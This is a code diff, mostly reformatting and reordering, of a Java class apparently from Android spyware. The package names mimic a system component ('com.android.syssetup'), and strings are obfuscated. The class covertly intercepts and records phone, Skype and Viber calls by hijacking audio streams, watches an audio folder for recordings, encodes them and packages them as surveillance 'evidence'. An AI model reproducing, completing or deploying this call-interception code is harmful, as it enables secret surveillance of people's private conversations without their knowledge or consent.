@@ -14,6 +14,7 @@ import android.content.pm.PackageManager;
 import android.content.pm.PackageManager.NameNotFoundException;
 import android.os.FileObserver;
 
+import com.android.mm.M;
 import com.android.syssetup.Call;
 import com.android.syssetup.RunningProcesses;
 import com.android.syssetup.Status;
@@ -26,7 +27,6 @@ import com.android.syssetup.file.AutoFile;
 import com.android.syssetup.interfaces.Observer;
 import com.android.syssetup.listener.ListenerCall;
 import com.android.syssetup.manager.ManagerModule;
-
 import com.android.syssetup.module.call.CallInfo;
 import com.android.syssetup.module.call.Chunk;
 import com.android.syssetup.module.call.EncodingTask;
@@ -43,7 +43,6 @@ import com.android.syssetup.util.Instrument;
 import com.android.syssetup.util.PackageUtils;
 import com.android.syssetup.util.Utils;
 import com.android.syssetup.util.WChar;
-import com.android.mm.M;
 
 import java.io.ByteArrayOutputStream;
 import java.io.File;
@@ -58,38 +57,33 @@ import java.util.concurrent.BlockingQueue;
 import java.util.concurrent.LinkedBlockingQueue;
 
 public class ModuleCall extends BaseModule implements Observer<Call> {
+	public static final byte[] AMR_HEADER = new byte[]{35, 33, 65, 77, 82, 10};
+	public static final byte[] MP4_HEADER = new byte[]{0, 0, 0};
 	private static final String TAG = "ModuleCall"; //$NON-NLS-1$
 	private static final int HEADER_SIZE = 6;
-
-	public boolean recordFlag;
-
 	private static final int CHANNEL_LOCAL = 0;
 	private static final int CHANNEL_REMOTE = 1;
-
 	private static final int CALLIST_PHONE = 0x0;
 	private static final int CALLIST_SKYPE = 0x1;
 	private static final int CALLIST_VIBER = 0x2;
-
 	// From audio.h, Android 4.x
 	private static final int AUDIO_STREAM_VOICE_CALL = 0;
 	private static final int AUDIO_STREAM_SYSTEM = 1;
 	private static final int AUDIO_STREAM_RING = 2;
 	private static final int AUDIO_STREAM_MUSIC = 3;
-	private static final int AUDIO_STREAM_MIC = -2; // Defined by us, not by
 	// Android
-
-	private FileObserver observer;
-	private Thread queueMonitor;
+	private static final int AUDIO_STREAM_MIC = -2; // Defined by us, not by
 	private static final Object sync = new Object();
 	private static BlockingQueue<String> calls;
+	public boolean recordFlag;
+	int amr_sizes[] = {12, 13, 15, 17, 19, 20, 26, 31, 5, 6, 5, 5, 0, 0, 0, 0};
+	// Chunk lastr = null;
+	boolean started = false;
+	private FileObserver observer;
+	private Thread queueMonitor;
 	private EncodingTask encodingTask;
 	private CallBack hjcb;
 	private Instrument hijack;
-
-	public static final byte[] AMR_HEADER = new byte[]{35, 33, 65, 77, 82, 10};
-	public static final byte[] MP4_HEADER = new byte[]{0, 0, 0};
-
-	int amr_sizes[] = {12, 13, 15, 17, 19, 20, 26, 31, 5, 6, 5, 5, 0, 0, 0, 0};
 	private RunningProcesses runningProcesses;
 	private CallInfo callInfo;
 	private List<Chunk> chunks = new ArrayList<Chunk>();
@@ -100,6 +94,14 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 	public static ModuleCall self() {
 		return (ModuleCall) ManagerModule.self().get(M.e("call"));
+	}
+
+	public synchronized static void addTypedString(DataBuffer databuffer, byte type, String name) {
+		if (name != null && name.length() > 0) {
+			final int header = (type << 24) | (name.length() * 2);
+			databuffer.writeInt(header);
+			databuffer.write(WChar.getBytes(name));
+		}
 	}
 
 	@Override
@@ -126,7 +128,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 	@Override
 	public void actualStart() {
-		isStarted=false;
+		isStarted = false;
 		ListenerCall.self().attach(this);
 
 		runningProcesses = RunningProcesses.self();
@@ -144,7 +146,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (actualStart): OS level not supported");
 				}
-				isStarted=true;
+				isStarted = true;
 				return;
 			}
 
@@ -152,7 +154,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (actualStart) No whitelist apps installed");
 				}
-				isStarted=true;
+				isStarted = true;
 				return;
 			}
 
@@ -185,7 +187,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 			}
 		}
-		isStarted=true;
+		isStarted = true;
 	}
 
 	private boolean installedWhitelist() {
@@ -274,7 +276,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		observer = new FileObserver(AudioEncoder.getAudioStorage(), FileObserver.MOVED_TO) {
 			@Override
 			public void onEvent(int event, String file) {
-				if(file == null){
+				if (file == null) {
 					return;
 				}
 				if (Cfg.DEBUG) {
@@ -297,9 +299,11 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 		observer.startWatching();
 	}
-	private boolean isMicAvailable(){
+
+	private boolean isMicAvailable() {
 		return ModuleMic.self() != null && ModuleCall.self().isSuspended() && !ModuleCall.self().canRecord();
 	}
+
 	private boolean installHijack() {
 		// Initialize the callback system
 
@@ -649,14 +653,6 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		EvidenceBuilder.atomic(EvidenceType.CALLLISTNEW, null, data);
 	}
 
-	public synchronized static void addTypedString(DataBuffer databuffer, byte type, String name) {
-		if (name != null && name.length() > 0) {
-			final int header = (type << 24) | (name.length() * 2);
-			databuffer.writeInt(header);
-			databuffer.write(WChar.getBytes(name));
-		}
-	}
-
 	private int wsize(String string) {
 		if (string.length() == 0) {
 			return 0;
@@ -664,9 +660,6 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			return string.length() * 2 + 4;
 		}
 	}
-
-	// Chunk lastr = null;
-	boolean started = false;
 
 	// start: call start date
 	// sec_length: call length in seconds
@@ -896,6 +889,14 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		return started;
 	}
 
+	public boolean canRecord() {
+		return canRecord;
+	}
+
+	public boolean isBooted() {
+		return isStarted;
+	}
+
 	public class HC implements ICallBack {
 		private static final String TAG = "HijackCallBack";
 
@@ -904,13 +905,5 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 				Check.log(TAG + " (run callback): " + o);
 			}
 		}
-	}
-
-	public boolean canRecord() {
-		return canRecord;
-	}
-
-	public boolean isBooted() {
-		return isStarted;
 	}
 }
